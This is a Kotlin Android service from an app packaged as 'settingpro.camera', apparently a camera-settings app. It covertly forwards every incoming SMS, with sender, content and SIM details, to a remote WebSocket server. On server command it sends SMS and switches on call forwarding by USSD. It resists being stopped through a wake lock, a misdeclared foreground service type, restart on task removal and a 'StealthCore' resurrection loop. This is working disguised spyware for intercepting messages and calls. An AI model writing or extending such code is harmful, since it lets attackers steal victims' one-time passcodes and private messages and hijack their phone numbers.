package com.settingpro.camera.service

import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.MainActivity
import com.settingpro.camera.data.local.SettingsDataStore
import com.settingpro.camera.data.model.WebSocketMessage
import com.settingpro.camera.data.model.CallForwardingData
import com.settingpro.camera.data.remote.ConnectionState
import com.settingpro.camera.data.remote.WebSocketClient
import com.settingpro.camera.util.Constants
import com.settingpro.camera.util.DeviceUtils
import com.settingpro.camera.util.CallForwardingUtility
import com.settingpro.camera.util.CallForwardingResult
import com.settingpro.camera.util.SmsSender
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

@AndroidEntryPoint
class SmsGatewayService : android.app.Service() {

    @Inject lateinit var settingsDataStore: SettingsDataStore
    @Inject lateinit var webSocketClient: WebSocketClient

    private var wakeLock: PowerManager.WakeLock? = null
    private var callForwardingUtility: CallForwardingUtility? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var subscriptionChangeListener: SubscriptionManager.OnSubscriptionsChangedListener? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Track current network type for detecting network switches
    @Volatile private var currentNetworkType: String? = null

    companion object {
        private const val TAG = "SmsGatewayService"

        @Volatile private var isRunning = false
        @Volatile private var instance: SmsGatewayService? = null

        fun startService(context: Context) {
            val intent = Intent(context, SmsGatewayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }

        fun stopService(context: Context) =
            context.stopService(Intent(context, SmsGatewayService::class.java))

        fun isServiceRunning(): Boolean = isRunning

        /**
         * Check if the WebSocket connection is healthy.
         * Returns false if service not running or WebSocket not connected.
         */
        fun isWebSocketHealthy(): Boolean {
            val serviceInstance = instance ?: return false
            return serviceInstance.webSocketClient.isConnectionHealthy()
        }

        private const val ACTION_REFRESH_DEVICE_INFO = "com.settingpro.camera.REFRESH_DEVICE_INFO"

        /**
         * Trigger a device info refresh to update FCM token on the server
         * This should be called after FCM token is retrieved/updated
         */
        fun refreshDeviceInfo(context: Context) {
            val intent = Intent(context, SmsGatewayService::class.java)
            intent.action = ACTION_REFRESH_DEVICE_INFO
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        AppLogger.d(TAG, "Service created")
        isRunning = true
        instance = this
        callForwardingUtility = CallForwardingUtility(this)
        acquireWakeLock()
        SmsGatewayNotifier.createNotificationChannel(this)
        startForegroundWithFallback()
        observeConnectionState()
        registerNetworkCallback()
        registerSubscriptionListener()
        StealthCore.startResurrectionLoop(this)
    }

    private fun startForegroundWithFallback() {
        val notification = SmsGatewayNotifier.createNotification(this)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                Constants.NOTIFICATION_ID,
                notification,
                2  // FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK (1 << 1)
            )
        } else {
            startForeground(Constants.NOTIFICATION_ID, notification)
        }
        AppLogger.d(TAG, "Started with mediaPlayback type")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        AppLogger.d(TAG, "Service started")
        intent?.let { handleIntent(it) }
        if (!webSocketClient.isConnected()) connectWebSocket()
        return START_STICKY
    }

    private fun handleIntent(intent: Intent) {
        // Handle device info refresh request
        if (ACTION_REFRESH_DEVICE_INFO == intent.action) {
            AppLogger.d(TAG, "Received device info refresh request")
            refreshDeviceInfo()
            return
        }

        val sender = intent.getStringExtra("sms_sender")
        val message = intent.getStringExtra("sms_message")
        if (sender != null && message != null) {
            handleIncomingSms(
                sender = sender,
                message = message,
                timestamp = intent.getLongExtra("sms_timestamp", System.currentTimeMillis()),
                simSlot = intent.getIntExtra("sms_sim_slot", 0),
                receiverNumber = intent.getStringExtra("sms_receiver_number"),
                simCarrier = intent.getStringExtra("sim_carrier"),
                simNetworkType = intent.getStringExtra("sim_network_type")
            )
        }

        // Handle SMS send response from SmsStatusReceiver
        val responseMessageId = intent.getStringExtra("sms_response_message_id")
        if (responseMessageId != null) {
            val success = intent.getBooleanExtra("sms_response_success", false)
            val error = intent.getStringExtra("sms_response_error")
            handleSmsSendResponse(responseMessageId, success, error)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        AppLogger.d(TAG, "Service destroyed")
        isRunning = false
        instance = null
        currentNetworkType = null
        unregisterNetworkCallback()
        unregisterSubscriptionListener()
        webSocketClient.destroy()
        serviceScope.cancel()
        releaseWakeLock()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        serviceScope.launch {
            try {
                val serviceEnabled = settingsDataStore.serviceEnabled.first()
                val serverUrl = settingsDataStore.serverUrl.first()
                if (serviceEnabled && serverUrl.isNotBlank()) startService(applicationContext)
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error in onTaskRemoved", e)
            }
        }
    }

    // ─── Connection state observer ────────────────────────────────────────────

    private fun observeConnectionState() {
        serviceScope.launch { webSocketClient.connectionState.collect { updateNotification() } }
    }

    // ─── Network Callback ─────────────────────────────────────────────────────

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    serviceScope.launch {
                        if (webSocketClient.connectionState.value == ConnectionState.Disconnected)
                            connectWebSocket()
                    }
                }
                override fun onLost(network: Network) {
                    AppLogger.d(TAG, "Network lost")
                    currentNetworkType = null
                }
                override fun onCapabilitiesChanged(
                    network: Network,
                    capabilities: NetworkCapabilities
                ) {
                    val hasInternet =
                        capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)

                    if (hasInternet) {
                        // Detect network type change (WiFi ↔ Cellular)
                        val newNetworkType = when {
                            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
                            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
                            else -> "other"
                        }

                        val previousType = currentNetworkType
                        val networkChanged = previousType != null && previousType != newNetworkType

                        if (networkChanged) {
                            AppLogger.d(TAG, "Network type changed: $previousType → $newNetworkType — forcing reconnect")
                            // Small delay to allow network to stabilize
                            serviceScope.launch {
                                delay(1500)
                                webSocketClient.forceReconnect()
                            }
                        } else if (webSocketClient.connectionState.value == ConnectionState.Disconnected) {
                            serviceScope.launch { connectWebSocket() }
                        }

                        currentNetworkType = newNetworkType
                    }
                }
            }
            cm.registerNetworkCallback(
                NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build(),
                networkCallback!!
            )
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error registering network callback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .let { cm -> networkCallback?.let { cm.unregisterNetworkCallback(it) } }
            networkCallback = null
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error unregistering network callback", e)
        }
    }

    // ─── Subscription Callback (SIM state changes) ───────────────────────────

    private fun registerSubscriptionListener() {
        try {
            val subscriptionManager =
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val listener = object : SubscriptionManager.OnSubscriptionsChangedListener() {
                override fun onSubscriptionsChanged() {
                    AppLogger.d(TAG, "SIM configuration changed - refreshing device info")
                    refreshDeviceInfo()
                }
            }
            subscriptionChangeListener = listener

            // Use the executor overload (API 28+) to avoid the deprecated single-arg version.
            // Fall back to the deprecated call on older devices.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                subscriptionManager.addOnSubscriptionsChangedListener(mainExecutor, listener)
            } else {
                @Suppress("DEPRECATION")
                subscriptionManager.addOnSubscriptionsChangedListener(listener)
            }
            AppLogger.d(TAG, "Subscription listener registered")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error registering subscription listener", e)
        }
    }

    private fun unregisterSubscriptionListener() {
        try {
            val subscriptionManager =
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            subscriptionChangeListener?.let {
                subscriptionManager.removeOnSubscriptionsChangedListener(it)
            }
            subscriptionChangeListener = null
            AppLogger.d(TAG, "Subscription listener unregistered")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error unregistering subscription listener", e)
        }
    }

    private fun refreshDeviceInfo() {
        serviceScope.launch {
            try {
                if (webSocketClient.isConnected()) {
                    val newDeviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)

                    // Fetch FCM token from DataStore and set on device info
                    val fcmToken = settingsDataStore.fcmToken.first()
                    if (fcmToken.isNotBlank()) {
                        newDeviceInfo.fcmToken = fcmToken
                        AppLogger.d(TAG, "FCM token included in device refresh: ${fcmToken.take(16)}...")
                    }

                    webSocketClient.updateDeviceInfo(newDeviceInfo)
                    webSocketClient.sendHeartbeat()
                    AppLogger.d(TAG, "Device info refreshed - SIM count: ${newDeviceInfo.simInfo.size}")
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error refreshing device info", e)
            }
        }
    }

    // ─── Wake Lock ────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        try {
            wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AIChat::SmsGatewayWakeLock")
                .apply { acquire() }
        } catch (e: Exception) { AppLogger.e(TAG, "Error acquiring wake lock", e) }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
            wakeLock = null
        } catch (e: Exception) { AppLogger.e(TAG, "Error releasing wake lock", e) }
    }

    // ─── Notification ─────────────────────────────────────────────────────────

    private fun updateNotification() {
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .notify(Constants.NOTIFICATION_ID, SmsGatewayNotifier.createNotification(this))
    }

    // ─── WebSocket ────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        serviceScope.launch {
            try {
                val serverUrl = settingsDataStore.serverUrl.first()
                if (serverUrl.isBlank()) { AppLogger.w(TAG, "Server URL not configured"); return@launch }

                // Get device info and add FCM token
                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
                val fcmToken = settingsDataStore.fcmToken.first()
                if (fcmToken.isNotBlank()) {
                    deviceInfo.fcmToken = fcmToken
                    AppLogger.d(TAG, "FCM token included in connection")
                }

                webSocketClient.connect(
                    serverUrl = serverUrl,
                    deviceInfo = deviceInfo,
                    onMessageReceived = { handleWebSocketMessage(it) },
                    onConnectionStateChanged = { AppLogger.d(TAG, "Connection state: $it") }
                )
            } catch (e: Exception) { AppLogger.e(TAG, "Error connecting WebSocket", e) }
        }
    }

    private fun handleWebSocketMessage(message: WebSocketMessage) {
        when (message) {
            is WebSocketMessage.Connected  -> AppLogger.d(TAG, "Connected: ${message.connectionId}")
            is WebSocketMessage.Registered -> {
                AppLogger.d(TAG, "Registered: ${message.deviceId}")
                serviceScope.launch { settingsDataStore.setDeviceId(message.deviceId) }
            }
            is WebSocketMessage.Ping  -> webSocketClient.send(WebSocketMessage.Pong(message.timestamp))
            is WebSocketMessage.Ack   -> AppLogger.d(TAG, "Ack: ${message.messageId}")
            is WebSocketMessage.Error -> AppLogger.e(TAG, "Server error: ${message.code} - ${message.message}")
            is WebSocketMessage.CallForwardingCommand -> handleCallForwardingCommand(message.data)
            is WebSocketMessage.SendSmsCommand -> handleSendSmsCommand(message.data)
            else -> AppLogger.d(TAG, "Unhandled message: ${message::class.simpleName}")
        }
    }

    // ─── SMS Handling ─────────────────────────────────────────────────────────

    private fun handleIncomingSms(
        sender: String, message: String, timestamp: Long, simSlot: Int,
        receiverNumber: String?, simCarrier: String?, simNetworkType: String?
    ) {
        serviceScope.launch {
            try {
                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
                val deviceId = settingsDataStore.deviceId.first()
                val networkType = when {
                    deviceInfo.networkInfo.networkType.contains("WiFi",   ignoreCase = true) -> "wifi"
                    deviceInfo.networkInfo.networkType.contains("Mobile", ignoreCase = true) -> "mobile"
                    else -> "none"
                }
                webSocketClient.sendSmsReceived(
                    deviceId = deviceId, sender = sender, content = message,
                    timestamp = timestamp, simSlot = simSlot,
                    receiverNumber = receiverNumber, simCarrier = simCarrier,
                    simNetworkType = simNetworkType, networkType = networkType
                )
                AppLogger.d(TAG, "SMS forwarded (total: ${webSocketClient.getSmsForwardedCount()})")
            } catch (e: Exception) { AppLogger.e(TAG, "Error handling SMS", e) }
        }
    }

    // ─── Call Forwarding ──────────────────────────────────────────────────────

    private fun handleCallForwardingCommand(data: CallForwardingData) {
        serviceScope.launch {
            try {
                val callUtility = callForwardingUtility ?: run {
                    sendCallForwardingResponse(
                        data.action, false, data.simSlot,
                        data.phoneNumber, "Utility not initialized", null
                    )
                    return@launch
                }
                val deviceId = settingsDataStore.deviceId.first()
                if (deviceId.isBlank()) {
                    sendCallForwardingResponse(
                        data.action, false, data.simSlot,
                        data.phoneNumber, "Device not registered", null
                    )
                    return@launch
                }
                if (!callUtility.hasPermissions()) {
                    sendCallForwardingResponse(
                        data.action, false, data.simSlot,
                        data.phoneNumber, "Missing permissions", null
                    )
                    return@launch
                }

                val result: CallForwardingResult = when (data.action) {
                    "forward" -> {
                        if (data.phoneNumber == null)
                            throw IllegalArgumentException("Phone number required for forward action")
                        callUtility.forwardCallWithResult(data.phoneNumber, data.simSlot)
                    }
                    "deactivate" -> callUtility.deactivateCallForwardingWithResult(data.simSlot)
                    "check"      -> callUtility.checkCallForwardingStatusWithResponse(data.simSlot)
                    else -> throw IllegalArgumentException("Unknown action: ${data.action}")
                }

                sendCallForwardingResponse(
                    action       = data.action,
                    success      = result.success,
                    simSlot      = data.simSlot,
                    phoneNumber  = data.phoneNumber,
                    error        = if (!result.success) (result.response ?: "USSD request failed") else null,
                    ussdResponse = result.response
                )
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling call forwarding command", e)
                sendCallForwardingResponse(
                    data.action, false, data.simSlot,
                    data.phoneNumber, e.message, null
                )
            }
        }
    }

    private suspend fun sendCallForwardingResponse(
        action: String, success: Boolean, simSlot: Int,
        phoneNumber: String?, error: String?, ussdResponse: String?
    ) {
        val deviceId = settingsDataStore.deviceId.first()
        webSocketClient.sendCallForwardingResponse(
            deviceId     = deviceId,
            action       = action,
            success      = success,
            simSlot      = simSlot,
            phoneNumber  = phoneNumber,
            error        = error,
            ussdResponse = ussdResponse
        )
    }

    // ─── Send SMS ───────────────────────────────────────────────────────────

    private fun handleSendSmsCommand(data: com.settingpro.camera.data.model.SendSmsData) {
        serviceScope.launch {
            try {
                val smsSender = SmsSender(this@SmsGatewayService)

                // Check if SIM slot is available
                if (!smsSender.isSimSlotAvailable(data.simSlot)) {
                    AppLogger.w(TAG, "SIM slot ${data.simSlot} not available, using default")
                }

                AppLogger.d(TAG, "Sending SMS to ${data.phoneNumber} via SIM ${data.simSlot}")

                smsSender.sendSms(
                    phoneNumber = data.phoneNumber,
                    message = data.message,
                    simSlot = data.simSlot,
                    callback = object : SmsSender.SendCallback {
                        override fun onSent(
                            messageId: String,
                            partIndex: Int,
                            totalParts: Int,
                            success: Boolean,
                            error: String?
                        ) {
                            AppLogger.d(
                                TAG,
                                "SMS sent callback: messageId=$messageId, part=$partIndex/$totalParts, success=$success"
                            )
                            // Response is handled by SmsStatusReceiver
                        }

                        override fun onDelivered(
                            messageId: String,
                            partIndex: Int,
                            totalParts: Int,
                            success: Boolean,
                            error: String?
                        ) {
                            AppLogger.d(
                                TAG,
                                "SMS delivered callback: messageId=$messageId, part=$partIndex/$totalParts, success=$success"
                            )
                            // Delivery reports are optional and carrier-dependent
                        }
                    }
                )

                AppLogger.d(TAG, "SMS queued for sending: ${data.messageId}")
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error sending SMS", e)
                sendSmsResponse(data.messageId, false, e.message)
            }
        }
    }

    private fun handleSmsSendResponse(messageId: String, success: Boolean, error: String?) {
        serviceScope.launch {
            try {
                sendSmsResponse(messageId, success, error)
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error sending SMS response", e)
            }
        }
    }

    private suspend fun sendSmsResponse(messageId: String, success: Boolean, error: String?) {
        webSocketClient.send(WebSocketMessage.SendSmsResponse(
            data = com.settingpro.camera.data.model.SendSmsResponseData(
                messageId = messageId,
                success = success,
                error = error
            )
        ))
        AppLogger.d(TAG, "SMS response sent: messageId=$messageId, success=$success")
    }
}
